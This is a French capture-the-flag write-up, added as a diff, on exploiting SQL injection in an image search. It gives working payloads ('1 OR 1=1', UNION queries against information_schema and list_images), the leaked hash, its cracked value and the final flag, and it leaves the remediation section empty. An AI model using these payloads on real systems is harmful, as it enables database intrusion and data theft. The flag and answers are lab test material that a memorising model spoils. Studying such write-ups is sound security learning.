@@ -1,0 +1,38 @@
+                SQL Injection (Images)
+
+En faisaint une recher d'images on peut s'apercevoir que celle ci est vulnérable à une injection SQL,
+en tapant 1 OR 1=1 on peut voir que la requête retourne toutes les images de la base de données.
+
+1 OR 1 = 1 est une expression booléenne qui est toujours vraie, donc a partir d'une requetes que l'on peut imaginer comme celle ci:
+
+SELECT id, title, url FROM images WHERE id = $_GET['id']
+
+qui va donc donner : 
+
+SELECT id, title, url FROM images WHERE id = 1 OR 1 = 1;
+
+qui va donc retourner tous les membres de la base de données.
+
+L'opérateur UNION permet de combiner les résultats de plusieurs requêtes SQL en une seule.
+On peut faire une requête de ce type pour récupérer le nom de la table et des colonnes de la base de données:
+1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns;
+
+On peut voir une table qui s'appele : "list_images" avec une column interessante : "comment", donc comme dans la faille avec la recherche de membre
+on peut  attaquer par ca :
+1 or 1=1 UNION select url, comment from list_images
+
+ID: 1 or 1=1 UNION select url, comment from list_images 
+Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+Url : borntosec.ddns.net/images.png
+
+Donc meme procede que pour les menbres :
+
+md5 -> albatroz
+albatroz en Sh256 -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+
+Risque :
+- Un attaquant peut recuperer des informations confidentielles dans la base de données
+
+Solution :
+
+
